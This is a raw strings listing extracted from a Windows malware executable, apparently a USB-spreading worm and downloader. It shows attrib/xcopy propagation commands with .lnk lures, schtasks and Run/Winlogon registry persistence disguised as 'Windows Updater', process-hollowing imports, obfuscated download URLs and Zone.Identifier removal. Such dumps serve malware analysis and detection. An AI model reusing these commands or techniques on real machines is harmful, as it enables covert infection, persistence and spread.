[Strings]
nth  paddr      vaddr      len  size section type    string
81   0x000015b8 0x004015b8 167  168  .text   ascii   /c "%%SystemRoot%%\explorer.exe %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
82   0x00001660 0x00401660 145  146  .text   ascii   /c "start %%cd%%%s & attrib -s -h %%cd%%%s & xcopy /F /S /Q /H /R /Y %%cd%%%s %%temp%%\%s\ & attrib +s +h %%cd%%%s & start %%temp%%\%s\%s & exit"
83   0x000016f4 0x004016f4 48   49   .text   ascii   %ALLUSERSPROFILE%\..\..\windows\system32\cmd.exe
84   0x00001728 0x00401728 33   34   .text   ascii   %SystemRoot%\system32\SHELL32.dll
85   0x0000174c 0x0040174c 33   34   .text   ascii   %SystemRoot%\system32\SHELL32.dll
86   0x00001770 0x00401770 25   26   .text   ascii   BCDEFGHIJKLMNOPQRSTUVWXYZ
87   0x0000178c 0x0040178c 52   53   .text   ascii   abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
88   0x000017c4 0x004017c4 10   11   .text   ascii   %s\c731200
89   0x000017d0 0x004017d0 10   11   .text   ascii   %s\c731200
90   0x000017dc 0x004017dc 4    5    .text   ascii   .exe
91   0x000017e4 0x004017e4 4    5    .text   ascii   %s\*
92   0x000017ec 0x004017ec 5    6    .text   ascii   %s\%s
93   0x000017f4 0x004017f4 5    6    .text   ascii   %s\%s
94   0x000017fc 0x004017fc 9    10   .text   ascii   %s\%s.lnk
95   0x00001808 0x00401808 5    6    .text   ascii   %s\%s
96   0x00001810 0x00401810 4    5    .text   ascii   .lnk
97   0x00001818 0x00401818 4    5    .text   ascii   .exe
98   0x00001820 0x00401820 4    5    .text   ascii   .pif
99   0x00001828 0x00401828 4    5    .text   ascii   .scr
100  0x00001830 0x00401830 4    5    .text   ascii   .cmd
101  0x00001838 0x00401838 4    5    .text   ascii   .com
102  0x00001840 0x00401840 5    6    .text   ascii   %s\%s
103  0x00001848 0x00401848 72   73   .text   ascii   abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890123456789
104  0x00001894 0x00401894 9    10   .text   ascii   HOMEDRIVE
105  0x000018a0 0x004018a0 15   16   .text   ascii   \Program Files\
106  0x000018b8 0x004018b8 14   15   .text   ascii   IsWow64Process
107  0x000018c8 0x004018c8 12   13   .text   ascii   kernel32.dll
108  0x000018d8 0x004018d8 10   11   .text   ascii   -aav_start
109  0x000018e4 0x004018e4 6    7    .text   ascii   -shell
110  0x000018ec 0x004018ec 33   34   .text   ascii   Windows_Shared_Mutex_231_c0009X00
111  0x00001910 0x00401910 13   14   .text   ascii   CFlagc0009X00
112  0x00001920 0x00401920 12   26   .text   utf16le \mspaint.exe
113  0x0000193c 0x0040193c 38   39   .text   ascii   SVCHOST_MUTEX_OBJECT_RELEASED_c0009X00
114  0x00001964 0x00401964 12   13   .text   ascii   kernel32.dll
115  0x00001974 0x00401974 14   15   .text   ascii   CreateProcessW
116  0x00001984 0x00401984 17   18   .text   ascii   GetProcessVersion
117  0x00001998 0x00401998 5    6    .text   ascii   Sleep
118  0x000019a0 0x004019a0 12   13   .text   ascii   CreateMutexA
119  0x000019b0 0x004019b0 11   12   .text   ascii   ExitProcess
120  0x000019bc 0x004019bc 12   13   .text   ascii   SetLastError
121  0x000019cc 0x004019cc 12   13   .text   ascii   GetLastError
122  0x000019dc 0x004019dc 12   26   .text   utf16le \svchost.exe
123  0x000019fc 0x004019fc 20   21   .text   ascii   NtUnmapViewOfSection
124  0x00001a14 0x00401a14 9    10   .text   ascii   ntdll.dll
125  0x00001a20 0x00401a20 19   20   .text   ascii   \ScreenSaverPro.scr
126  0x00001a34 0x00401a34 9    10   .text   ascii   \temp.bin
127  0x00001a40 0x00401a40 10   11   .text   ascii   user32.dll
128  0x00001a4c 0x00401a4c 12   13   .text   ascii   advapi32.dll
129  0x00001a5c 0x00401a5c 11   12   .text   ascii   shell32.dll
130  0x00001a68 0x00401a68 10   11   .text   ascii   urlmon.dll
131  0x00001a74 0x00401a74 11   12   .text   ascii   wininet.dll
132  0x00001a80 0x00401a80 9    10   .text   ascii   gdi32.dll
133  0x00001a8c 0x00401a8c 10   11   .text   ascii   rpcrt4.dll
134  0x00001a98 0x00401a98 12   13   .text   ascii   netapi32.dll
135  0x00001aa8 0x00401aa8 7    8    .text   ascii   USBProc
136  0x00001ab4 0x00401ab4 7    8    .text   ascii   USBProc
137  0x00001ac4 0x00401ac4 17   18   .text   ascii   .gonewiththewings
138  0x00001ad8 0x00401ad8 5    6    .text   ascii   *.exe
139  0x00001ae0 0x00401ae0 17   18   .text   ascii   .gonewiththewings
140  0x00001af4 0x00401af4 18   19   .text   ascii   *.gonewiththewings
141  0x00001b0c 0x00401b0c 26   27   .text   ascii   \WindowsUpdate\Updater.exe
142  0x00001b28 0x00401b28 4    5    .text   ascii   \*.*
143  0x00001b34 0x00401b34 5    6    .text   ascii   %s\%s
144  0x00001b3c 0x00401b3c 14   15   .text   ascii   \CreativeAudio
145  0x00001b4c 0x00401b4c 10   11   .text   ascii   \Microsoft
146  0x00001b58 0x00401b58 18   19   .text   ascii   \Microsoft\Windows
147  0x00001b6c 0x00401b6c 10   11   .text   ascii   \bett2f002
148  0x00001b78 0x00401b78 14   15   .text   ascii   \CreativeAudio
149  0x00001b88 0x00401b88 11   12   .text   ascii   \Identities
150  0x00001b94 0x00401b94 10   11   .text   ascii   \bett2f002
151  0x00001ba0 0x00401ba0 18   19   .text   ascii   \Microsoft\Windows
152  0x00001bb4 0x00401bb4 10   11   .text   ascii   \Microsoft
153  0x00001bc0 0x00401bc0 10   11   .text   ascii   \bett2f002
154  0x00001bcc 0x00401bcc 14   15   .text   ascii   \CreativeAudio
155  0x00001bdc 0x00401bdc 11   12   .text   ascii   \Identities
156  0x00001be8 0x00401be8 10   11   .text   ascii   \Microsoft
157  0x00001bf4 0x00401bf4 11   12   .text   ascii   \Identities
158  0x00001c00 0x00401c00 15   16   .text   ascii   ALLUSERSPROFILE
159  0x00001c10 0x00401c10 29   30   .text   ascii   %s\Program Files\Common Files
160  0x00001c30 0x00401c30 10   11   .text   ascii   \bett2f002
161  0x00001c40 0x00401c40 14   15   .text   ascii   %s\programdata
162  0x00001c50 0x00401c50 10   11   .text   ascii   \bett2f002
163  0x00001c5c 0x00401c5c 29   30   .text   ascii   %s\Program Files\Common Files
164  0x00001c7c 0x00401c7c 14   15   .text   ascii   \CreativeAudio
165  0x00001c90 0x00401c90 14   15   .text   ascii   %s\programdata
166  0x00001ca0 0x00401ca0 14   15   .text   ascii   \CreativeAudio
167  0x00001cb4 0x00401cb4 6    7    .text   ascii   \adobe
168  0x00001cc0 0x00401cc0 5    6    .text   ascii   *.exe
169  0x00001cc8 0x00401cc8 17   18   .text   ascii   .gonewiththewings
170  0x00001cdc 0x00401cdc 18   19   .text   ascii   *.gonewiththewings
171  0x00001cf0 0x00401cf0 12   13   .text   ascii   kernel32.dll
172  0x00001d00 0x00401d00 36   37   .text   ascii   abcdefghijklmnopqrstuvwxyz0123456789
173  0x00001d28 0x00401d28 18   19   .text   ascii   SSLOADasdasc000900
174  0x00001d3c 0x00401d3c 11   12   .text   ascii   CloseHandle
175  0x00001d48 0x00401d48 11   12   .text   ascii   CreateFileA
176  0x00001d54 0x00401d54 11   12   .text   ascii   DeleteFileA
177  0x00001d60 0x00401d60 11   12   .text   ascii   ExitProcess
178  0x00001d6c 0x00401d6c 11   12   .text   ascii   GetFileSize
179  0x00001d78 0x00401d78 14   15   .text   ascii   GetProcAddress
180  0x00001d88 0x00401d88 13   14   .text   ascii   GetSystemTime
181  0x00001d98 0x00401d98 12   13   .text   ascii   GetTempPathA
182  0x00001da8 0x00401da8 12   13   .text   ascii   LoadLibraryA
183  0x00001db8 0x00401db8 8    9    .text   ascii   lstrcatA
184  0x00001dc4 0x00401dc4 8    9    .text   ascii   lstrlenA
185  0x00001dd0 0x00401dd0 8    9    .text   ascii   ReadFile
186  0x00001ddc 0x00401ddc 18   19   .text   ascii   SetFileAttributesA
187  0x00001df0 0x00401df0 7    8    .text   ascii   WinExec
188  0x00001df8 0x00401df8 9    10   .text   ascii   WriteFile
189  0x00001e04 0x00401e04 5    6    .text   ascii   Sleep
190  0x00001e0c 0x00401e0c 12   13   .text   ascii   GetLastError
191  0x00001e1c 0x00401e1c 12   13   .text   ascii   CreateMutexA
192  0x00001e2c 0x00401e2c 7    8    .text   ascii   c731200
193  0x00001e38 0x00401e38 10   11   .text   ascii   user32.dll
194  0x00001e44 0x00401e44 10   11   .text   ascii   urlmon.dll
195  0x00001e50 0x00401e50 9    10   .text   ascii   wsprintfA
196  0x00001e5c 0x00401e5c 18   19   .text   ascii   URLDownloadToFileA
197  0x00001e70 0x00401e70 11   12   .text   ascii   wininet.dll
198  0x00001e7c 0x00401e7c 24   25   .text   ascii   InternetCheckConnectionA
199  0x00001e98 0x00401e98 21   22   .text   ascii   http://www.google.com
200  0x00001eb0 0x00401eb0 4    5    .text   ascii   .exe
201  0x00001eb8 0x00401eb8 7    8    .text   ascii   c731200
202  0x00001ec0 0x00401ec0 43   44   .text   ascii   9EEAi^^2A:`]H:A>2?:2]4@>]H:A>D4]CF^2A:`]8:7
203  0x00001eec 0x00401eec 43   44   .text   ascii   9EEAi^^2A:a]H:A>2?:2]4@>]H:A>D4]CF^2A:a]8:7
204  0x00001f18 0x00401f18 43   44   .text   ascii   9EEAi^^2A:b]H:A>2?:2]4@>]H:A>D4]CF^2A:b]8:7
205  0x00001f44 0x00401f44 43   44   .text   ascii   9EEAi^^2A:c]H:A>2?:2]4@>]H:A>D4]CF^2A:c]8:7
206  0x00001f70 0x00401f70 43   44   .text   ascii   9EEAi^^2A:d]H:A>2?:2]4@>]H:A>D4]CF^2A:d]8:7
207  0x00001f9c 0x00401f9c 43   44   .text   ascii   9EEAi^^2A:e]H:A>2?:2]4@>]H:A>D4]CF^2A:e]8:7
208  0x00001fc8 0x00401fc8 43   44   .text   ascii   9EEAi^^2A:f]H:A>2?:2]4@>]H:A>D4]CF^2A:f]8:7
209  0x00001ff4 0x00401ff4 43   44   .text   ascii   9EEAi^^2A:g]H:A>2?:2]4@>]H:A>D4]CF^2A:g]8:7
210  0x00002020 0x00402020 43   44   .text   ascii   9EEAi^^2A:h]H:A>2?:2]4@>]H:A>D4]CF^2A:h]8:7
211  0x0000204c 0x0040204c 40   41   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]7@H5_]CF^2A:]8:7
212  0x00002078 0x00402078 42   43   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]D6=7>8`]CF^2A:]8:7
213  0x000020a4 0x004020a4 42   43   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]=@EFDda]CF^2A:]8:7
214  0x000020d0 0x004020d0 46   47   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]H:A>2?:2]CF^{<HpIs]8:7
215  0x00002100 0x00402100 43   44   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]=@EJD]CF^Gy@yp:]8:7
216  0x0000212c 0x0040212c 43   44   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]3H2ED]CF^~7;%|6]8:7
217  0x00002158 0x00402158 43   44   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]DE4FD]CF^2A$!9G]8:7
218  0x00002184 0x00402184 44   45   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]4>@6?b]CF^K<>4w|]8:7
219  0x000021b4 0x004021b4 46   47   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]2CE34@?b]CF^7C7{6r]8:7
220  0x000021e4 0x004021e4 44   45   .text   ascii   9EEAi^^2A:]H:A>2?:2]4@>]J6=@E@]CF^KHu|Hs]8:7
221  0x00002214 0x00402214 47   48   .text   ascii   9EEAi^^FA52E6]H:A>2?:2]4@>]C2F=9@DE]CF^=@8@]8:7
222  0x00002244 0x00402244 9    10   .text   ascii   \calc.exe
223  0x00002250 0x00402250 7    8    .text   ascii   APPDATA
224  0x00002258 0x00402258 26   27   .text   ascii   \WindowsUpdate\Updater.exe
225  0x00002274 0x00402274 8    9    .text   ascii   \c731200
226  0x00002280 0x00402280 9    10   .text   ascii   \System32
227  0x0000228c 0x0040228c 22   23   .text   ascii   \System32\schtasks.exe
228  0x000022a4 0x004022a4 26   27   .text   ascii   \WindowsUpdate\Updater.exe
229  0x000022c0 0x004022c0 33   34   .text   ascii   "%s" /query /tn "Windows Updater"
230  0x000022e8 0x004022e8 67   68   .text   ascii   "%s" /CREATE /SC ONLOGON /TN "Windows Updater" /TR "%s" /RL HIGHEST
231  0x0000232c 0x0040232c 9    10   .text   ascii   \System32
232  0x00002338 0x00402338 22   23   .text   ascii   \System32\schtasks.exe
233  0x00002350 0x00402350 55   56   .text   ascii   "%s" /delete /tn "Windows Update Check - 0x05860166" /f
234  0x00002388 0x00402388 55   56   .text   ascii   "%s" /delete /tn "Windows Update Check - 0x0E7302EC" /f
235  0x000023c0 0x004023c0 55   56   .text   ascii   "%s" /delete /tn "Windows Update Check - 0x5C000766" /f
236  0x000023f8 0x004023f8 55   56   .text   ascii   "%s" /delete /tn "Windows Update Check - 0x6E0A0825" /f
237  0x00002430 0x00402430 38   39   .text   ascii   "%s" /delete /tn "Windows Debugger" /f
238  0x00002458 0x00402458 7    8    .text   ascii   APPDATA
239  0x00002460 0x00402460 26   27   .text   ascii   \WindowsUpdate\Updater.exe
240  0x0000247c 0x0040247c 45   46   .text   ascii   SOFTWARE\Microsoft\Windows\CurrentVersion\Run
241  0x000024ac 0x004024ac 24   25   .text   ascii   Windows Update Installer
242  0x000024c8 0x004024c8 7    8    .text   ascii   APPDATA
243  0x000024d0 0x004024d0 14   15   .text   ascii   \WindowsUpdate
244  0x000024e0 0x004024e0 12   13   .text   ascii   \Updater.exe
245  0x000024f0 0x004024f0 7    8    .text   ascii   APPDATA
246  0x000024f8 0x004024f8 7    8    .text   ascii   \Update
247  0x00002500 0x00402500 13   14   .text   ascii   \Explorer.exe
248  0x00002510 0x00402510 7    8    .text   ascii   APPDATA
249  0x00002518 0x00402518 7    8    .text   ascii   \Update
250  0x00002520 0x00402520 11   12   .text   ascii   \Update.exe
251  0x0000252c 0x0040252c 45   46   .text   ascii   SOFTWARE\Microsoft\Windows\CurrentVersion\Run
252  0x0000255c 0x0040255c 24   25   .text   ascii   Windows Update Installer
253  0x00002578 0x00402578 11   12   .text   ascii   notepad.exe
254  0x00002584 0x00402584 11   12   .text   ascii   msiexec.exe
255  0x00002590 0x00402590 9    10   .text   ascii   bfsvc.exe
256  0x0000259c 0x0040259c 12   13   .text   ascii   helppane.exe
257  0x000025ac 0x004025ac 6    7    .text   ascii   hh.exe
258  0x000025b4 0x004025b4 11   12   .text   ascii   regedit.exe
259  0x000025c0 0x004025c0 12   13   .text   ascii   twunk_16.exe
260  0x000025d0 0x004025d0 12   13   .text   ascii   twunk_32.exe
261  0x000025e0 0x004025e0 11   12   .text   ascii   winhelp.exe
262  0x000025ec 0x004025ec 12   13   .text   ascii   winhlp32.exe
263  0x000025fc 0x004025fc 9    10   .text   ascii   write.exe
264  0x00002608 0x00402608 13   14   .text   ascii   Reader_sl.exe
265  0x00002618 0x00402618 42   43   .text   ascii   SVCHOST_MUTEX_OBJECT_RELEASED_c0009X00GOAL
266  0x00002644 0x00402644 11   12   .text   ascii   mspaint.exe
267  0x00002650 0x00402650 12   13   .text   ascii   \mspaint.exe
268  0x00002660 0x00402660 43   44   .text   ascii   MonitorPaint_MUTEX_OBJECT_RELEASED_c0009X00
269  0x0000268c 0x0040268c 12   13   .text   ascii   \mspaint.exe
270  0x0000269c 0x0040269c 45   46   .text   ascii   MonitorSvchost_MUTEX_OBJECT_RELEASED_c0009X00
271  0x000026cc 0x004026cc 12   13   .text   ascii   \svchost.exe
272  0x000026dc 0x004026dc 10   22   .text   utf16le user32.dll
273  0x000026f4 0x004026f4 12   26   .text   utf16le advapi32.dll
274  0x00002710 0x00402710 11   24   .text   utf16le shell32.dll
275  0x00002728 0x00402728 9    20   .text   utf16le ole32.dll
276  0x0000273c 0x0040273c 11   24   .text   utf16le shlwapi.dll
277  0x00002754 0x00402754 11   24   .text   utf16le wininet.dll
278  0x0000276c 0x0040276c 10   22   .text   utf16le rpcrt4.dll
279  0x00002784 0x00402784 12   26   .text   utf16le netapi32.dll
280  0x000027a0 0x004027a0 10   22   .text   utf16le urlmon.dll
281  0x000027b8 0x004027b8 11   24   .text   utf16le crypt32.dll
282  0x000027d0 0x004027d0 12   26   .text   utf16le wtsapi32.dll
283  0x000027ec 0x004027ec 10   22   .text   utf16le samcli.dll
284  0x00002804 0x00402804 12   26   .text   utf16le netutils.dll
285  0x00002820 0x00402820 11   24   .text   utf16le userenv.dll
286  0x00002838 0x00402838 23   48   .text   utf16le WindowsSecondaryDesktop
287  0x00002868 0x00402868 12   26   .text   utf16le \charmap.exe
288  0x00002888 0x00402888 32   66   .text   utf16le \Windows Media Player\wmprph.exe
289  0x000028cc 0x004028cc 7    8    .text   ascii   log.txt
290  0x000028e0 0x004028e0 26   27   .text   ascii   \WindowsUpdate\Updater.exe
291  0x000028fc 0x004028fc 53   54   .text   ascii   SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
292  0x00002934 0x00402934 7    8    .text   ascii   Taskman
293  0x0000293c 0x0040293c 6    7    .text   ascii   %s\*.*
294  0x00002944 0x00402944 5    6    .text   ascii   %s\%s
295  0x0000294c 0x0040294c 60   61   .text   ascii   %s\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
296  0x00002990 0x00402990 63   64   .text   ascii   %s\Documents and Settings\All users\Start Menu\Programs\Startup
297  0x000029d0 0x004029d0 25   26   .text   ascii   \Microsoft\Windows\Themes
298  0x000029ec 0x004029ec 14   15   .text   ascii   \WindowsUpdate
299  0x000029fc 0x004029fc 13   14   .text   ascii   \Windows Live
300  0x00002a0c 0x00402a0c 45   46   .text   ascii   Software\Microsoft\Windows\CurrentVersion\Run
301  0x00002a3c 0x00402a3c 49   50   .text   ascii   Software\Microsoft\Windows\CurrentVersion\RunOnce
302  0x00002a70 0x00402a70 45   46   .text   ascii   Software\Microsoft\Windows\CurrentVersion\Run
303  0x00002aa0 0x00402aa0 49   50   .text   ascii   Software\Microsoft\Windows\CurrentVersion\RunOnce
304  0x00002ad4 0x00402ad4 11   12   .text   ascii   %s\Recycler
305  0x00002ae0 0x00402ae0 5    6    .text   ascii   %s\%s
306  0x00002ae8 0x00402ae8 6    7    .text   ascii   %s\*.*
307  0x00002af4 0x00402af4 8    9    .text   ascii   alFSVWJB
308  0x00002b00 0x00402b00 6    7    .text   ascii   %s\*.*
309  0x00002b08 0x00402b08 5    6    .text   ascii   %s\%s
310  0x00002b10 0x00402b10 5    6    .text   ascii   %s\%s
311  0x00002b18 0x00402b18 15   16   .text   ascii   ALLUSERSPROFILE
312  0x00002b28 0x00402b28 14   15   .text   ascii   \CreativeAudio
313  0x00002b3c 0x00402b3c 26   27   .text   ascii   \WindowsUpdate\Updater.exe
314  0x00002b58 0x00402b58 45   46   .text   ascii   Software\Microsoft\Windows\CurrentVersion\Run
315  0x00002b88 0x00402b88 24   25   .text   ascii   Windows Update Installer
316  0x00002ba4 0x00402ba4 9    10   .text   ascii   bfsvc.exe
317  0x00002bb0 0x00402bb0 12   13   .text   ascii   helppane.exe
318  0x00002bc0 0x00402bc0 6    7    .text   ascii   hh.exe
319  0x00002bc8 0x00402bc8 11   12   .text   ascii   regedit.exe
320  0x00002bd4 0x00402bd4 12   13   .text   ascii   twunk_16.exe
321  0x00002be4 0x00402be4 12   13   .text   ascii   twunk_32.exe
322  0x00002bf4 0x00402bf4 11   12   .text   ascii   winhelp.exe
323  0x00002c00 0x00402c00 12   13   .text   ascii   winhlp32.exe
324  0x00002c10 0x00402c10 9    10   .text   ascii   write.exe
325  0x00002c1c 0x00402c1c 13   14   .text   ascii   Reader_sl.exe
326  0x00002c2c 0x00402c2c 9    10   .text   ascii   %appdata%
327  0x00002c38 0x00402c38 6    7    .text   ascii   %temp%
328  0x00002c40 0x00402c40 8    9    .text   ascii   %windir%
329  0x00002c4c 0x00402c4c 12   13   .text   ascii   %systemroot%
330  0x00002c5c 0x00402c5c 14   15   .text   ascii   %programfiles%
331  0x00002c6c 0x00402c6c 6    7    .text   ascii   %root%
332  0x00002c74 0x00402c74 35   36   .text   ascii   %programfiles%\Common Files\*\*.exe
333  0x00002c98 0x00402c98 33   34   .text   ascii   %appdata%\Microsoft\Windows\*.exe
334  0x00002cbc 0x00402cbc 14   15   .text   ascii   IsWow64Process
335  0x00002ccc 0x00402ccc 12   13   .text   ascii   kernel32.dll
336  0x00002ce4 0x00402ce4 9    10   .text   ascii   WindowsId
337  0x00002cf0 0x00402cf0 9    10   .text   ascii   WindowsId
338  0x00002cfc 0x00402cfc 20   21   .text   ascii   Microsoft\Windows\%s
339  0x00002d14 0x00402d14 5    6    .text   ascii   %s\%s
340  0x00002d1c 0x00402d1c 12   13   .text   ascii   %s\%s\%s.exe
341  0x00002d2c 0x00402d2c 16   17   .text   ascii   :Zone.Identifier
342  0x00002d40 0x00402d40 16   17   .text   ascii   :Zone.Identifier
343  0x00002d54 0x00402d54 12   13   .text   ascii   .quarantined
344  0x00002d64 0x00402d64 11   12   .text   ascii   "%s" -shell
345  0x00002d70 0x00402d70 5    6    .text   ascii   Shell
346  0x00002d78 0x00402d78 10   11   .text   ascii   "%s" -bind
347  0x00002d88 0x00402d88 12   13   .text   ascii   userinit.exe
348  0x00002d98 0x00402d98 12   13   .text   ascii   explorer.exe
349  0x00002da8 0x00402da8 5    6    .text   ascii   %s\%s
350  0x00002db0 0x00402db0 19   20   .text   ascii   Microsoft\Windows\%
351  0x00002dc4 0x00402dc4 5    6    .text   ascii   %s\%s
